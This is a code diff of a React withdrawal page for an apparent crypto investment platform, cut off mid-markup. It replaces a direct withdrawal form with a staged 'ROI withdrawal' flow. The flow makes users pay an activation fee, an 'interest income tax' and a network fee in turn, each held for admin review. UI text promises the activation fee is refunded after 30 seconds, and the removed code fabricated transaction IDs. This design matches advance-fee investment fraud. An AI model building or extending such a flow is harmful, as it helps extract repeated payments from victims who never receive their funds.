@@ -1,90 +1,115 @@
 ﻿// src/pages/Withdraw.js
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { FiArrowLeft, FiCheck, FiInfo, FiClock, FiDollarSign, FiCopy } from 'react-icons/fi';
-import { submitWithdrawal, verifyWithdrawalPin } from '../services/withdrawalAPI';
+import { FiArrowLeft, FiCheck, FiInfo, FiClock, FiDollarSign, FiCopy, FiAlertTriangle, FiShield } from 'react-icons/fi';
 import WithdrawalHistory from '../components/WithdrawalHistory';
-import { getUserWithdrawals } from '../services/userWithdrawalAPI';
 import { useUser } from '../contexts/UserContext';
 import { useUserDataRefresh } from '../contexts/UserDataRefreshContext';
-import axios from 'axios';
+import axios from '../utils/axios';
+import {
+  getUserWithdrawals,
+  payActivationFee,
+  submitWithdrawalForm,
+  payInterestTax,
+  payNetworkFee,
+} from '../services/userWithdrawalAPI';
+
+const statusLabels = {
+  awaiting_activation_fee: 'Awaiting Activation Fee',
+  activation_fee_paid: 'Activation Fee Paid — Awaiting Admin Review',
+  activation_fee_rejected: 'Activation Fee Rejected',
+  activation_fee_approved: 'Activation Fee Approved',
+  awaiting_interest_tax: 'Awaiting Interest Income Tax',
+  interest_tax_paid: 'Interest Tax Paid — Awaiting Admin Review',
+  interest_tax_rejected: 'Interest Tax Rejected',
+  withdrawal_processing: 'Withdrawal Processing',
+  awaiting_network_fee: 'Awaiting Network Fee',
+  network_fee_paid: 'Network Fee Paid — Awaiting Admin Review',
+  withdrawal_successful: 'Withdrawal Successful',
+  completed: 'Completed',
+  rejected: 'Rejected',
+  failed: 'Failed',
+};
+
+const statusDescriptions = {
+  awaiting_activation_fee: 'Your ROI withdrawal request is waiting for the activation fee. Pay the fee from your available balance to continue.',
+  activation_fee_paid: 'Your activation fee has been paid. Please wait for admin approval before submitting the withdrawal form.',
+  activation_fee_rejected: 'The activation fee payment was rejected. Pay the full fee again and resubmit.',
+  activation_fee_approved: 'Activation fee approved. Submit the withdrawal form with your wallet address and selected cryptocurrency.',
+  awaiting_interest_tax: 'The system calculated the interest income tax for this withdrawal. Pay the tax to continue.',
+  interest_tax_paid: 'Interest tax payment received. Waiting for admin approval to begin processing.',
+  interest_tax_rejected: 'Interest tax payment was rejected. Complete the remaining payment and resubmit.',
+  withdrawal_processing: 'Your withdrawal is processing. It will move to the network fee stage automatically after the processing window expires.',
+  awaiting_network_fee: 'The withdrawal is ready for network fee payment. Pay the fee to finalize the transaction.',
+  network_fee_paid: 'Network fee payment received. Waiting for admin verification to finalize the withdrawal.',
+  withdrawal_successful: 'Your withdrawal has been finalized and sent to your wallet address.',
+  completed: 'Withdrawal completed.',
+  rejected: 'Withdrawal rejected by the admin.',
+  failed: 'Withdrawal failed. Please contact support.',
+};
+
+const networks = [
+  { id: 'BTC', name: 'Bitcoin (BTC)', currencies: ['BTC'] },
+  { id: 'ETH', name: 'Ethereum (ETH)', currencies: ['ETH'] },
+  { id: 'ERC20', name: 'USDT on ERC20 (Ethereum)', currencies: ['USDT'] },
+  { id: 'TRC20', name: 'USDT on TRC20 (Tron)', currencies: ['USDT'] },
+  { id: 'BEP20', name: 'USDT on BEP20 (Binance Smart Chain)', currencies: ['USDT'] },
+];
+
+const activeStatuses = new Set([
+  'awaiting_activation_fee',
+  'activation_fee_paid',
+  'activation_fee_rejected',
+  'activation_fee_approved',
+  'awaiting_interest_tax',
+  'interest_tax_paid',
+  'interest_tax_rejected',
+  'withdrawal_processing',
+  'awaiting_network_fee',
+  'network_fee_paid',
+]);
+
+const getNetworkFeeLabel = (currency, network) => {
+  if (currency === 'ETH' || network === 'ETH' || network === 'ERC20') {
+    return 'Low Gas Fee';
+  }
+  return "Low Miner's Fee";
+};
+
+function validateWalletAddress(address, network) {
+  if (!address) return false;
+  switch (network) {
+    case 'BTC':
+      return (
+        (address.startsWith('1') && address.length >= 26 && address.length <= 35) ||
+        (address.startsWith('3') && address.length >= 26 && address.length <= 35) ||
+        (address.toLowerCase().startsWith('bc1') && address.length >= 42 && address.length <= 62)
+      );
+    case 'ERC20':
+    case 'BEP20':
+      return /^0x[a-fA-F0-9]{40}$/.test(address);
+    case 'TRC20':
+      return /^T[a-zA-Z0-9]{33}$/.test(address);
+    default:
+      return false;
+  }
+}
 
 const Withdraw = () => {
   const [withdrawals, setWithdrawals] = useState([]);
-  const { kycStatus } = useUser();
-  const { refreshUserData } = useUserDataRefresh();
-  const [step, setStep] = useState(1);
-  const [amount, setAmount] = useState('');
-  const [walletAddress, setWalletAddress] = useState('');
-  const [selectedNetwork, setSelectedNetwork] = useState('ERC20');
-  const [isSubmitting, setIsSubmitting] = useState(false);
-  const [transactionId, setTransactionId] = useState('');
+  const [activeWithdrawal, setActiveWithdrawal] = useState(null);
   const [availableBalance, setAvailableBalance] = useState(0);
   const [lockedBalance, setLockedBalance] = useState(0);
-  const [loading, setLoading] = useState(true);
-  const [pin, setPin] = useState('');
-  const [pinError, setPinError] = useState('');
+  const [walletAddress, setWalletAddress] = useState('');
+  const [selectedNetwork, setSelectedNetwork] = useState('ERC20');
   const [currency, setCurrency] = useState('USDT');
-  const [liveRate, setLiveRate] = useState(null);
+  const [loading, setLoading] = useState(true);
+  const [actionLoading, setActionLoading] = useState(false);
+  const [actionError, setActionError] = useState('');
+  const { kycStatus } = useUser();
+  const { refreshUserData } = useUserDataRefresh();
   const navigate = useNavigate();
 
-  // Available networks and currencies
-  const networks = [
-    { id: 'BTC', name: 'Bitcoin (BTC)', currencies: ['BTC'] },
-    { id: 'ETH', name: 'Ethereum (ETH)', currencies: ['ETH'] },
-    { id: 'ERC20', name: 'USDT on ERC20 (Ethereum)', currencies: ['USDT'] },
-    { id: 'TRC20', name: 'USDT on TRC20 (Tron)', currencies: ['USDT'] },
-    { id: 'BEP20', name: 'USDT on BEP20 (Binance Smart Chain)', currencies: ['USDT'] },
-  ];
-
-  // Function to refresh user balances
-  const refreshBalances = async () => {
-    try {
-      const response = await axios.get('/api/portfolio');
-      setAvailableBalance(response.data.userInfo?.availableBalance ?? 0);
-      setLockedBalance(response.data.userInfo?.lockedBalance ?? 0);
-      console.log('[WITHDRAW] Balances refreshed:', { available: response.data.userInfo?.availableBalance, locked: response.data.userInfo?.lockedBalance });
-    } catch (err) {
-      console.error('[WITHDRAW] Failed to refresh balances:', err);
-    }
-  };
-
-  // Fetch user balances
-  useEffect(() => {
-    // Fetch user withdrawals from backend
-    const fetchWithdrawals = async () => {
-      try {
-        const data = await getUserWithdrawals();
-        setWithdrawals(data);
-      } catch (err) {
-        setWithdrawals([]);
-      }
-    };
-    fetchWithdrawals();
-
-    // Fetch dashboard available balance from backend
-    const fetchBalances = async () => {
-      try {
-        console.log('[WITHDRAW] Fetching balances from portfolio API...');
-        const response = await axios.get('/api/portfolio');
-        setAvailableBalance(response.data.userInfo?.availableBalance ?? 0);
-        setLockedBalance(response.data.userInfo?.lockedBalance ?? 0);
-        console.log('[WITHDRAW] Balances fetched on mount:', { available: response.data.userInfo?.availableBalance, locked: response.data.userInfo?.lockedBalance });
-        // Optionally, set other balances if needed
-      } catch (err) {
-        console.error('[WITHDRAW] Failed to fetch balances:', err);
-        setAvailableBalance(0);
-        setLockedBalance(0);
-      } finally {
-        setLoading(false);
-      }
-    };
-
-    fetchBalances();
-  }, []);
-
-  // In your withdrawal form (step 1), add a currency selector if needed, or set currency based on network selection
-  // For now, set currency automatically based on network
   useEffect(() => {
     if (selectedNetwork === 'BTC') setCurrency('BTC');
     else if (selectedNetwork === 'ETH') setCurrency('ETH');
@@ -93,129 +118,308 @@ const Withdraw = () => {
     else if (selectedNetwork === 'BEP20') setCurrency('USDT');
   }, [selectedNetwork]);
 
-  // Fetch live crypto rates for confirmation step
-  useEffect(() => {
-    if (step === 2) {
-      const fetchRate = async () => {
-        let url = '';
-        if (currency === 'BTC') url = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd';
-        else if (currency === 'ETH') url = 'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd';
-        else if (currency === 'BNB') url = 'https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd';
-        else if (currency === 'USDT') url = 'https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd';
-        if (!url) return;
-        try {
-            const safeFetch = require('../utils/safeFetch').default;
-            const { ok, data } = await safeFetch(url);
-          if (currency === 'BTC') setLiveRate(data.bitcoin.usd);
-          else if (currency === 'ETH') setLiveRate(data.ethereum.usd);
-          else if (currency === 'BNB') setLiveRate(data.binancecoin.usd);
-          else if (currency === 'USDT') setLiveRate(data.tether.usd);
-        } catch {
-          setLiveRate(null);
-        }
-      };
-      fetchRate();
-    }
-  }, [step, currency]);
+  const findActiveWithdrawal = (items) => {
+    if (!Array.isArray(items)) return null;
+    return items
+      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
+      .find((w) => activeStatuses.has(w.status));
+  };
 
-  // Calculate live crypto amount for confirmation step
-  const liveCryptoAmount = liveRate ? (parseFloat(amount) / liveRate).toFixed(8) : '--';
-
-  // Ensure currency is always BTC when network is BTC before submitting
-  const handleConfirmWithdrawal = async () => {
-    setIsSubmitting(true);
+  const refreshBalances = async () => {
     try {
-      let submitCurrency = currency;
-      let submitNetwork = selectedNetwork;
-      if (selectedNetwork === 'BTC') {
-        submitCurrency = 'BTC';
-        submitNetwork = 'BTC';
-      } else if (selectedNetwork === 'ETH') {
-        submitCurrency = 'ETH';
-        submitNetwork = 'ETH';
+      const response = await axios.get('/api/portfolio');
+      setAvailableBalance(response.data.userInfo?.availableBalance ?? 0);
+      setLockedBalance(response.data.userInfo?.lockedBalance ?? 0);
+    } catch (err) {
+      console.error('[WITHDRAW] Failed to refresh balances:', err);
+    }
+  };
+
+  const refreshWithdrawals = async () => {
+    try {
+      const data = await getUserWithdrawals();
+      setWithdrawals(data);
+      setActiveWithdrawal(findActiveWithdrawal(data));
+      if (!data || data.length === 0) {
+        setActiveWithdrawal(null);
       }
-      const result = await submitWithdrawal({
-        amount: parseFloat(amount),
-        currency: submitCurrency,
-        network: submitNetwork,
-        address: walletAddress,
-        pin
-      });
-      if (!result || !result.cryptoCurrency || !result.cryptoAmount || !result.conversionRate) {
-        setPinError('Withdrawal failed. Please try again.');
-        setIsSubmitting(false);
-        return;
-      }
-      // Simulate server response delay
-      await new Promise(resolve => setTimeout(resolve, 1500));
-      // Generate fake transaction ID
-      const fakeId = `WD-${Math.random().toString(36).substr(2, 10).toUpperCase()}`;
-      setTransactionId(fakeId);
-      setStep(3);
-      refreshUserData(); // Trigger global refresh
-      // Also refresh local balances
-      await refreshBalances();
-    } catch (error) {
-      setPinError(error?.msg || 'Withdrawal error.');
+    } catch (err) {
+      console.error('[WITHDRAW] Failed to fetch user withdrawals:', err);
+    }
+  };
+
+  useEffect(() => {
+    const initialize = async () => {
+      setLoading(true);
+      await Promise.all([refreshBalances(), refreshWithdrawals()]);
+      setLoading(false);
+    };
+    initialize();
+  }, []);
+
+  useEffect(() => {
+    if (activeWithdrawal && activeWithdrawal.walletAddress) {
+      setWalletAddress(activeWithdrawal.walletAddress);
+    }
+  }, [activeWithdrawal]);
+
+  const handlePayActivationFee = async () => {
+    if (!activeWithdrawal) return;
+    setActionError('');
+    setActionLoading(true);
+    try {
+      const fee = activeWithdrawal.activationFeeAmount || 10;
+      await payActivationFee(activeWithdrawal._id || activeWithdrawal.id, fee);
+      await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+    } catch (err) {
+      setActionError(err?.message || err?.error || 'Failed to pay activation fee');
     } finally {
-      setIsSubmitting(false);
+      setActionLoading(false);
     }
   };
 
-  const handleNewWithdrawal = () => {
-    setAmount('');
-    setWalletAddress('');
-    setTransactionId('');
-    setStep(1);
-  };
-
-  const copyToClipboard = (text) => {
-    navigator.clipboard.writeText(text);
-    if (window.toast) window.toast.success('Copied!');
-  };
-
-  // Helper: Validate wallet address for each network
-  function validateWalletAddress(address, network) {
-    if (!address) return false;
-    switch (network) {
-      case 'BTC':
-        // Accept all valid Bitcoin address types: Legacy (1), P2SH (3), Bech32 (bc1)
-        // Legacy (P2PKH): 1..., 26-35 chars
-        // P2SH: 3..., 26-35 chars
-        // Bech32: bc1..., 42-62 chars
-        return (
-          (address.startsWith('1') && address.length >= 26 && address.length <= 35) ||
-          (address.startsWith('3') && address.length >= 26 && address.length <= 35) ||
-          (address.toLowerCase().startsWith('bc1') && address.length >= 42 && address.length <= 62)
-        );
-      case 'ERC20':
-        // Ethereum address check (starts with 0x, 42 chars)
-        return /^0x[a-fA-F0-9]{40}$/.test(address);
-      case 'TRC20':
-        // Tron address check (starts with T, 34 chars)
-        return /^T[a-zA-Z0-9]{33}$/.test(address);
-      case 'BEP20':
-        // BEP20 uses Ethereum address format
-        return /^0x[a-fA-F0-9]{40}$/.test(address);
-      default:
-        return false;
-    }
-  }
-
-  // Validate PIN with backend before proceeding to confirmation
-  const handleAmountSubmit = async (e) => {
-    e.preventDefault();
-    setPinError('');
-    if (!/^[0-9]{6}$/.test(pin)) {
-      setPinError('PIN must be exactly 6 digits.');
+  const handleSubmitWithdrawalForm = async () => {
+    if (!activeWithdrawal) return;
+    if (!validateWalletAddress(walletAddress, selectedNetwork)) {
+      setActionError('Please enter a valid wallet address for the selected network.');
       return;
     }
+    setActionError('');
+    setActionLoading(true);
     try {
-      await verifyWithdrawalPin(pin);
-      setStep(2);
-    } catch (error) {
-      setPinError(error?.msg || 'Invalid withdrawal PIN.');
+      await submitWithdrawalForm(activeWithdrawal._id || activeWithdrawal.id, {
+        walletAddress,
+        currency,
+        network: selectedNetwork,
+      });
+      await Promise.all([refreshWithdrawals(), refreshUserData()]);
+    } catch (err) {
+      setActionError(err?.message || err?.error || 'Failed to submit withdrawal form');
+    } finally {
+      setActionLoading(false);
     }
+  };
+
+  const handlePayInterestTax = async () => {
+    if (!activeWithdrawal || !activeWithdrawal.interestTaxAmount) return;
+    setActionError('');
+    setActionLoading(true);
+    try {
+      await payInterestTax(activeWithdrawal._id || activeWithdrawal.id, activeWithdrawal.interestTaxAmount);
+      await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+    } catch (err) {
+      setActionError(err?.message || err?.error || 'Failed to pay interest tax');
+    } finally {
+      setActionLoading(false);
+    }
+  };
+
+  const handlePayNetworkFee = async () => {
+    if (!activeWithdrawal || !activeWithdrawal.networkFeeAmount) return;
+    setActionError('');
+    setActionLoading(true);
+    try {
+      await payNetworkFee(activeWithdrawal._id || activeWithdrawal.id, activeWithdrawal.networkFeeAmount);
+      await Promise.all([refreshBalances(), refreshWithdrawals(), refreshUserData()]);
+    } catch (err) {
+      setActionError(err?.message || err?.error || 'Failed to pay network fee');
+    } finally {
+      setActionLoading(false);
+    }
+  };
+
+  const handleStartWithdrawal = () => {
+    navigate('/dashboard/portfolio');
+  };
+
+  const renderActionPanel = () => {
+    if (!activeWithdrawal) {
+      return (
+        <div className="glassmorphic p-6 rounded-xl bg-gray-900 border border-gray-700">
+          <h3 className="text-xl font-bold mb-4">No active ROI withdrawal request</h3>
+          <p className="text-gray-400 mb-4">
+            Start an ROI withdrawal from your completed investment details page. Once the request is created, you can pay the activation fee, submit the withdrawal form, and pay the tax and network fees here.
+          </p>
+          <button
+            type="button"
+            onClick={handleStartWithdrawal}
+            className="bg-gold text-black rounded-lg px-5 py-3 font-bold hover:bg-yellow-600 transition"
+          >
+            Go to Investments
+          </button>
+        </div>
+      );
+    }
+
+    const status = activeWithdrawal.status;
+    const feeLabel = getNetworkFeeLabel(activeWithdrawal.currency, activeWithdrawal.network);
+    const canPayActivation = ['awaiting_activation_fee', 'activation_fee_rejected', 'activation_fee_paid'].includes(status);
+    const canSubmitForm = status === 'activation_fee_approved';
+    const canPayTax = ['awaiting_interest_tax', 'interest_tax_rejected', 'interest_tax_paid'].includes(status);
+    const canPayNetwork = ['awaiting_network_fee', 'network_fee_rejected', 'network_fee_paid'].includes(status);
+
+    return (
+      <div className="glassmorphic p-6 rounded-xl bg-gray-900 border border-gray-700">
+        <div className="mb-6">
+          <div className="flex items-center justify-between gap-4">
+            <div>
+              <p className="text-sm uppercase tracking-[0.24em] text-gray-400">Current Withdrawal Stage</p>
+              <h3 className="text-2xl font-bold mt-2 text-white">{statusLabels[status] || status}</h3>
+            </div>
+            <div className="px-3 py-2 rounded-full bg-gray-800 text-sm text-gray-200">
+              {activeWithdrawal.type === 'roi' ? 'ROI Withdrawal' : 'Withdrawal'}
+            </div>
+          </div>
+          <p className="text-gray-400 mt-3 max-w-2xl">{statusDescriptions[status] || 'Follow the prompts to complete your withdrawal.'}</p>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+          <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
+            <p className="text-gray-400 text-sm">Requested Amount</p>
+            <p className="text-white text-3xl font-semibold mt-2">${activeWithdrawal.amount?.toFixed(2) ?? '0.00'}</p>
+            <p className="text-gray-500 text-sm mt-2">Reserved from locked balance</p>
+          </div>
+          <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
+            <p className="text-gray-400 text-sm">Available Balance</p>
+            <p className="text-white text-3xl font-semibold mt-2">${availableBalance.toFixed(2)}</p>
+            <p className="text-gray-500 text-sm mt-2">Used for fees and verification</p>
+          </div>
+        </div>
+
+        {actionError && (
+          <div className="bg-red-900 border border-red-700 text-red-100 px-4 py-3 rounded-lg mb-6">
+            {actionError}
+          </div>
+        )}
+
+        {canPayActivation && (
+          <div className="space-y-4 mb-6">
+            <div className="bg-gray-850 p-4 rounded-lg border border-gray-700">
+              <div className="flex items-center justify-between">
+                <div>
+                  <p className="text-gray-400 text-sm">Activation Fee</p>
+                  <p className="text-white font-semibold text-2xl mt-2">${activeWithdrawal.activationFeeAmount ?? 10}</p>
+                </div>
+                <div className="text-right text-sm text-gray-400">
+                  <p>Verification fee charged from your available balance.</p>
+                  <p className="mt-1 text-xs text-gray-500">This fee is refunded automatically after 30 seconds.</p>
+                </div>
+              </div>
+            </div>
+            <button
+              type="button"
+              onClick={handlePayActivationFee}
+              disabled={actionLoading || availableBalance < (activeWithdrawal.activationFeeAmount ?? 10)}
+              className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < (activeWithdrawal.activationFeeAmount ?? 10) ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+            >
+              {actionLoading ? 'Processing...' : `Pay Activation Fee`}
+            </button>
+            {availableBalance < (activeWithdrawal.activationFeeAmount ?? 10) && (
+              <p className="text-red-400 text-sm">Insufficient available balance to pay the activation fee.</p>
+            )}
+          </div>
+        )}
+
+        {canSubmitForm && (
+          <div className="space-y-4 mb-6">
+            <div className="bg-gray-850 p-4 rounded-lg border border-gray-700">
+              <p className="text-gray-400 text-sm">Withdrawal details</p>
+              <div className="mt-4 grid grid-cols-1 gap-4">
+                <label className="block">
+                  <span className="text-gray-400 text-sm">Network</span>
+                  <select
+                    value={selectedNetwork}
+                    onChange={(e) => setSelectedNetwork(e.target.value)}
+                    className="w-full mt-2 bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
+                  >
+                    {networks.map((network) => (
+                      <option key={network.id} value={network.id}>{network.name}</option>
+                    ))}
+                  </select>
+                </label>
+
+                <label className="block">
+                  <span className="text-gray-400 text-sm">Wallet Address</span>
+                  <input
+                    type="text"
+                    value={walletAddress}
+                    onChange={(e) => setWalletAddress(e.target.value)}
+                    placeholder={selectedNetwork === 'BTC' ? 'e.g. 1A1zP1...' : selectedNetwork === 'ERC20' ? 'e.g. 0x...' : selectedNetwork === 'TRC20' ? 'e.g. T...' : 'e.g. 0x...'}
+                    className="w-full mt-2 bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
+                  />
+                  {!validateWalletAddress(walletAddress, selectedNetwork) && walletAddress && (
+                    <p className="text-red-400 text-xs mt-2">Invalid wallet address for selected network.</p>
+                  )}
+                </label>
+              </div>
+            </div>
+            <button
+              type="button"
+              onClick={handleSubmitWithdrawalForm}
+              disabled={actionLoading || !walletAddress || !validateWalletAddress(walletAddress, selectedNetwork)}
+              className={`w-full py-3 rounded-lg font-bold ${actionLoading || !walletAddress || !validateWalletAddress(walletAddress, selectedNetwork) ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+            >
+              {actionLoading ? 'Submitting...' : 'Submit Withdrawal Form'}
+            </button>
+          </div>
+        )}
+
+        {canPayTax && activeWithdrawal.interestTaxAmount > 0 && (
+          <div className="space-y-4 mb-6">
+            <div className="bg-gray-850 p-4 rounded-lg border border-gray-700">
+              <p className="text-gray-400 text-sm">Interest Income Tax</p>
+              <p className="text-white font-semibold text-2xl mt-2">${activeWithdrawal.interestTaxAmount?.toFixed(2) ?? '0.00'}</p>
+              <p className="text-gray-500 text-sm mt-2">Tax is calculated on your available balance.</p>
+            </div>
+            <button
+              type="button"
+              onClick={handlePayInterestTax}
+              disabled={actionLoading || availableBalance < activeWithdrawal.interestTaxAmount}
+              className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < activeWithdrawal.interestTaxAmount ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+            >
+              {actionLoading ? 'Processing...' : 'Pay Interest Income Tax'}
+            </button>
+            {availableBalance < activeWithdrawal.interestTaxAmount && (
+              <p className="text-red-400 text-sm">Insufficient available balance to pay the interest tax.</p>
+            )}
+          </div>
+        )}
+
+        {status === 'withdrawal_processing' && (
+          <div className="bg-gray-850 p-4 rounded-lg border border-gray-700 mb-6">
+            <p className="text-gray-400 text-sm">This withdrawal is currently processing.</p>
+            <p className="text-white font-semibold mt-3">Please wait until the processing period ends and the network fee stage opens.</p>
+          </div>
+        )}
+
+        {canPayNetwork && activeWithdrawal.networkFeeAmount > 0 && (
+          <div className="space-y-4 mb-6">
+            <div className="bg-gray-850 p-4 rounded-lg border border-gray-700">
+              <p className="text-gray-400 text-sm">{feeLabel}</p>
+              <p className="text-white font-semibold text-2xl mt-2">${activeWithdrawal.networkFeeAmount?.toFixed(2) ?? '0.00'}</p>
+              <p className="text-gray-500 text-sm mt-2">This fee is required to send the withdrawal over the selected blockchain network.</p>
+            </div>
+            <button
+              type="button"
+              onClick={handlePayNetworkFee}
+              disabled={actionLoading || availableBalance < activeWithdrawal.networkFeeAmount}
+              className={`w-full py-3 rounded-lg font-bold ${actionLoading || availableBalance < activeWithdrawal.networkFeeAmount ? 'bg-gray-700 cursor-not-allowed' : 'bg-gold text-black hover:bg-yellow-600'}`}
+            >
+              {actionLoading ? 'Processing...' : `Pay ${feeLabel}`}
+            </button>
+            {availableBalance < activeWithdrawal.networkFeeAmount && (
+              <p className="text-red-400 text-sm">Insufficient available balance to pay the network fee.</p>
+            )}
+          </div>
+        )}
+
+        {status === 'withdrawal_successful' && (
+          <div className="bg-green-900 bg-opacity-20 p-4 rounded-lg border border-green-700 mb-6">
+            <p className="text-green-200">Your withdrawal has been successfully finalized. Funds should now be on the selected wallet address.</p>
+          </div>
+        )}
+      </div>
+    );
   };
 
   if (loading) {
@@ -237,309 +441,33 @@ const Withdraw = () => {
   }
 
   return (
-    <div className="max-w-4xl w-full mx-auto p-2 sm:p-4 overflow-auto">
-      {/* Navigation Header */}
-      <div className="flex flex-col sm:flex-row items-center mb-4 sm:mb-6 gap-2 sm:gap-0">
-        {step > 1 && (
-          <button 
-            onClick={() => setStep(step - 1)}
-            className="mr-4 p-2 rounded-full hover:bg-gray-800 transition"
-          >
-            <FiArrowLeft size={20} />
-          </button>
-        )}
-        <h1 className="text-xl sm:text-2xl font-bold text-center w-full">
-          {step === 1 && 'Withdraw Funds'}
-          {step === 2 && 'Confirm Withdrawal'}
-          {step === 3 && 'Withdrawal Submitted'}
-        </h1>
+    <div className="max-w-5xl w-full mx-auto p-2 sm:p-4 overflow-auto">
+      <div className="flex flex-col sm:flex-row items-center justify-between mb-6 gap-4">
+        <div>
+          <h1 className="text-3xl font-bold">ROI Withdrawal Center</h1>
+          <p className="text-gray-400 mt-2">Manage your staged ROI withdrawal requests, activation fees, tax payments, and network fees in one place.</p>
+        </div>
       </div>
 
-      {/* Step Indicator */}
-      <div className="flex justify-between items-center mb-8 max-w-md mx-auto">
-        {[1, 2, 3].map((stepNumber) => (
-          <React.Fragment key={stepNumber}>
-            <div
-              className={`flex items-center justify-center w-10 h-10 rounded-full ${
-                step >= stepNumber ? 'bg-gold text-black' : 'bg-gray-800 text-gray-400'
-              } font-medium`}
-            >
-              {stepNumber}
-            </div>
-            {stepNumber < 3 && (
-              <div
-                className={`flex-1 h-1 mx-2 ${
-                  step > stepNumber ? 'bg-gold' : 'bg-gray-800'
-                }`}
-              ></div>
-            )}
-          </React.Fragment>
-        ))}
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
+        <div className="bg-gray-800 p-6 rounded-xl border border-gray-700">
+          <p className="text-gray-400 text-sm uppercase tracking-[0.24em] mb-2">Available Balance</p>
+          <p className="text-3xl font-semibold text-white">${availableBalance.toLocaleString()}</p>
+        </div>
+        <div className="bg-gray-800 p-6 rounded-xl border border-gray-700">
+          <p className="text-gray-400 text-sm uppercase tracking-[0.24em] mb-2">Locked Balance</p>
+          <p className="text-3xl font-semibold text-white">${lockedBalance.toLocaleString()}</p>
+        </div>
       </div>
 
-      {/* Step 1: Withdrawal Form */}
-      {step === 1 && (
-        <div className="glassmorphic p-6 rounded-xl">
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-            <div className="bg-gray-800 bg-opacity-30 p-4 rounded-lg">
-              <h3 className="text-lg font-bold mb-2 flex items-center">
-                <FiDollarSign className="mr-2 text-gold" /> Available Balance
-              </h3>
-              <p className="text-2xl">${availableBalance.toLocaleString()}</p>
-              <p className="text-sm text-gray-400 mt-2">Ready to withdraw</p>
-            </div>
-            <div className="bg-gray-800 bg-opacity-30 p-4 rounded-lg">
-              <h3 className="text-lg font-bold mb-2 flex items-center">
-                <FiClock className="mr-2 text-gold" /> Locked Balance
-              </h3>
-              <p className="text-2xl">${lockedBalance.toLocaleString()}</p>
-              <p className="text-sm text-gray-400 mt-2">In active investments</p>
-            </div>
-          </div>
+      {renderActionPanel()}
 
-          <form onSubmit={handleAmountSubmit}>
-            <div className="mb-6">
-              <label className="block text-gray-400 mb-2">Withdrawal Amount (USD)</label>
-              <div className="relative">
-                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400">
-                  $
-                </span>
-                <input
-                  type="number"
-                  value={amount}
-                  onChange={(e) => setAmount(e.target.value)}
-                  min="10"
-                  max={availableBalance}
-                  step="0.01"
-                  className="w-full bg-dark border border-gray-700 rounded-lg py-3 pl-8 pr-4 focus:border-gold focus:outline-none"
-                  placeholder={`Max $${availableBalance.toLocaleString()}`}
-                  required
-                />
-              </div>
-              {amount && parseFloat(amount) > availableBalance && (
-                <p className="text-red-400 text-sm mt-2">
-                  Amount exceeds available balance
-                </p>
-              )}
-              {amount && parseFloat(amount) < 10 && (
-                <p className="text-red-400 text-sm mt-2">
-                  Minimum withdrawal is $10
-                </p>
-              )}
-            </div>
-
-            <div className="mb-6">
-              <label className="block text-gray-400 mb-2">Withdrawal Network</label>
-              <select
-                value={selectedNetwork}
-                onChange={(e) => setSelectedNetwork(e.target.value)}
-                className="w-full bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
-              >
-                {networks.map((network) => (
-                  <option key={network.id} value={network.id}>
-                    {network.name}
-                  </option>
-                ))}
-              </select>
-            </div>
-
-            <div className="mb-6">
-              <label className="block text-gray-400 mb-2">Destination Wallet Address</label>
-              <div className="relative">
-                <input
-                  type="text"
-                  value={walletAddress}
-                  onChange={(e) => setWalletAddress(e.target.value)}
-                  className="w-full bg-dark border border-gray-700 rounded-lg py-3 px-4 pr-10 focus:border-gold focus:outline-none"
-                  placeholder={
-                    selectedNetwork === 'BTC' ? 'e.g. 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' :
-                    selectedNetwork === 'ERC20' ? 'e.g. 0x...' :
-                    selectedNetwork === 'TRC20' ? 'e.g. T...' :
-                    selectedNetwork === 'BEP20' ? 'e.g. 0x...' :
-                    ''
-                  }
-                  required
-                />
-                {walletAddress && (
-                  <button
-                    type="button"
-                    onClick={() => copyToClipboard(walletAddress)}
-                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gold"
-                  >
-                    <FiCopy />
-                  </button>
-                )}
-              </div>
-              {!validateWalletAddress(walletAddress, selectedNetwork) && walletAddress && (
-                <p className="text-red-400 text-xs mt-2">Invalid wallet address for selected network.</p>
-              )}
-              <p className="text-xs text-gray-500 mt-2">
-                Ensure the address supports the selected network
-              </p>
-            </div>
-
-            <div className="mb-6">
-              <label className="block text-gray-400 mb-2">6-Digit Withdrawal PIN</label>
-              <input
-                type="password"
-                value={pin}
-                onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                className="w-full bg-dark border border-gray-700 rounded-lg py-3 px-4 focus:border-gold focus:outline-none"
-                placeholder="Enter your 6-digit PIN"
-                required
-                maxLength={6}
-                minLength={6}
-                pattern="[0-9]{6}"
-              />
-              {pinError && <p className="text-red-400 text-xs mt-2">{pinError}</p>}
-            </div>
-
-            <div className="bg-gray-800 bg-opacity-50 p-4 rounded-lg mb-6">
-              <div className="flex items-start">
-                <FiInfo className="text-gold mt-1 mr-3 flex-shrink-0" />
-                <div>
-                  <p className="text-sm text-gray-300 mb-1">
-                    Withdrawals are processed within 24 hours. A network fee may apply.
-                  </p>
-                </div>
